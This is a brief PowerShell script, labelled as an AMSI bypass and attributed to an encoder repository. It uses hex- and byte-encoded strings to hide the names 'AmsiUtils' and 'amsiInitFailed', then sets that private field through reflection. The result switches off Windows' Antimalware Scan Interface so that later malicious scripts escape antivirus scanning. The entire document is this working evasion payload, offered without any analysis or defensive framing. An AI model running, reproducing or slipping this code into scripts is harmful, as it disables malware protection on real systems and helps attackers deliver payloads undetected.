# https://github.com/Chainski/AES-Encoder | Amsi Bypass
$ph5QZJmzF7SgZtFHqv5zDd9zawJFa9pnJRTiecvHoXJEN3YK74 = (-join ([regex]::Matches("53797374656d2e4d616e6167656d656e742e4175746f6d6174696f6e2e416d73695574696c73", '..') | ForEach-Object { [char]([convert]::ToUInt32($_.Value, 16)) }))
$r9kSTo4wARdWCKkXKAbeeLTuxsuUhJRMZDny9rAHaxuCnxsmat = [Text.Encoding]::UTF8.GetString((0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64))
$assembly = [Ref].Assembly
$type = $assembly.GetType($ph5QZJmzF7SgZtFHqv5zDd9zawJFa9pnJRTiecvHoXJEN3YK74)
$field = $type.GetField($r9kSTo4wARdWCKkXKAbeeLTuxsuUhJRMZDny9rAHaxuCnxsmat, 'NonPublic, Static')
$field.SetValue($null, $true)
